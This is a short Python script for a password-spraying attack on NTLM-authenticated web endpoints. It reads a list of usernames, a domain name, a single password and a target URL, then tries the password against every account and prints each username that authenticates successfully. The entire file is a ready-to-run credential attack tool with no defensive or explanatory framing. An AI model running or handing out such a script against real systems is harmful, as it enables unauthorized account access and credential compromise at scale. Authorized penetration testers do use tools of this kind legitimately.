from itertools import count
from urllib import response
import requests
from requests_ntlm2 import HttpNtlmAuth
import sys

userfile = input("Specify filename with users: ")
fqdn = input("Main FQDN: ")
password = input("Password to Spray: ")
attackurl = input("URL to Attack: ")

with open(userfile, "r") as users:
    userSpray = users.read().splitlines()
    
# print(userSpray)

if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
    # Start Spraying
    print("[*] Starting passwords spray attack using the following password: " + password)
    count = 0
    # Load Users
    for user in userSpray:
        domainUser = fqdn + "\\" + user
        # print(domain)
        # Start Auth
        auth=HttpNtlmAuth(domainUser,password)
        response = requests.get(attackurl, auth=auth)
        if (response.status_code == 200):
            print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

